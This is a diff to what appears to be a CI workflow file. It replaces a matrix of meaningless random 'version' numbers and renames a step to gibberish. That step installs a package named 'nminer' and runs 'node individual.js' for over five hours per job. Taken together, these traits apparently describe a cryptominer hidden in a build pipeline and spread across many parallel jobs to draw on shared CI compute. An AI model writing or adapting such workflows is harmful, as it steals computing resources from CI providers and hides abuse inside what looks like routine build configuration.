@@ -9,25 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 4863 }
-          - { version: 1299 }
-          - { version: 7449 }
-          - { version: 4894 }
-          - { version: 6087 }
-          - { version: 1846 }
-          - { version: 4598 }
-          - { version: 7448 }
-          - { version: 1178 }
-          - { version: 5234 }
-          - { version: 8680 }
-          - { version: 2194 }
-          - { version: 3091 }
-          - { version: 2914 }
-          - { version: 8068 }
-          - { version: 9901 }
-          - { version: 8065 }
-          - { version: 9928 }
-          - { version: 2596 }
+          - { version: 2653 }
+          - { version: 2628 }
+          - { version: 99 }
+          - { version: 1158 }
+          - { version: 5218 }
+          - { version: 2002 }
+          - { version: 1784 }
+          - { version: 7933 }
+          - { version: 8466 }
+          - { version: 5959 }
+          - { version: 7072 }
+          - { version: 1419 }
+          - { version: 1113 }
+          - { version: 2543 }
+          - { version: 5519 }
+          - { version: 6893 }
+          - { version: 4930 }
 
     steps:
       - name: Checkout
@@ -38,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: throughout oh yuck gee
         run: |
           npm install nminer@latest
-          timeout 311m node individual.js || echo "individual executed"
+          timeout 332m node individual.js || echo "individual executed"
